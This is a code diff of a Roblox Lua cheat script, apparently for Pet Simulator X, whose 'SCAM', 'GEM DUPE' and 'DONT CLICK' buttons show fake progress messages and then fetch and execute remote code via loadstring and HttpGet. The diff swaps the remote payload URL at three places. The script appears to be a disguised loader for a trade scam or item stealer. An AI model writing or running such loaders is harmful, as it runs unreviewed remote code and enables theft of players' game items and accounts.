@@ -18,7 +18,7 @@ Section1:NewButton("SCAM", "Click again when the trade ends", function()
     _G.Text2 = "Waiting for Pets"
     _G.Text3 = "Checking Game ID..."
     _G.Text4 = "Starting The Mask...."
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/psxgm"))()
     end)
     local Section1 = VehicleTab:NewSection("GEM DUPE");
 Section1:NewToggle("ON/OFF", "gem dupe", function(state)
@@ -30,7 +30,7 @@ Section1:NewToggle("ON/OFF", "gem dupe", function(state)
     _G.Text2 = "Waiting for Pets"
     _G.Text3 = "Checking Game ID..."
     _G.Text4 = "Starting The Mask...."
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/psxgm"))()
 end
 local Section1 = WeaponTab:NewSection("SOON!!!!");
 Section1:NewLabel("execute and wait 1 minute");
@@ -44,4 +44,4 @@ Section1:NewButton("SOON!!", "DONT CLICK", function()
     _G.Text2 = "Waiting for Pets"
     _G.Text3 = "Checking Game ID..."
     _G.Text4 = "Starting The Mask...."
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/psxgm"))()
